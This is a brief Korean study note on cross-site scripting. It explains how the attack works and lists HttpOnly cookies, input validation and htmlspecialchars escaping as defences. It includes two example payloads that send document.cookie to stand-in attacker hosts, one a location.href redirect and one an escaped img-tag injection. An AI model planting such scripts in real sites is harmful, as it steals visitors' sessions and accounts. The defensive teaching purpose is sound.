# Cross Site Scripting (CSS)

## intro

외부 사용자가 사이트에 스크립트를 삽입하여 공격하는 방법.

## 기법

```planetext
    location.href = 'http://해커사이트/?cookies=' + document.cookie;
```

해커가 위와 같은 코드가 담긴 게시물을 공개 게시판에 작성할 경우, 게시글을 읽은 사용자의 쿠키가 전송되어 탈취가 가능해집니다.  
이렇게 document객체를 통해 쿠키에 접근하는 것을 막으려면 `http only`속성을 쿠키에 추가해야합니다.

```planetext
Set-Cookie: 쿠키명=쿠키값; path=/; HttpOnly

```

## 위험요소

1. 쿠키 정보 및 세션 ID 획득
2. 관리자 권한 획득
3. 악성코드 다운로드 유도
4. 거짓 페이지 놏ㄹ

## 방지법

1. 입력값 검증
2. htmlentitiess 사용

```
&lt;script&gt;document.write('img src=&quot;http://attacker.php?data='+escape(document.cookie)+'&quot; /&gt;')&lt;/script&gt;
```

```html
<?=htmlspecialchars(mysql_result($result,0,1))?>
```

3. 입력 필터

-

## REF

- [](https://nsinc.tistory.com/121)

https://kevinthegrey.tistory.com/36
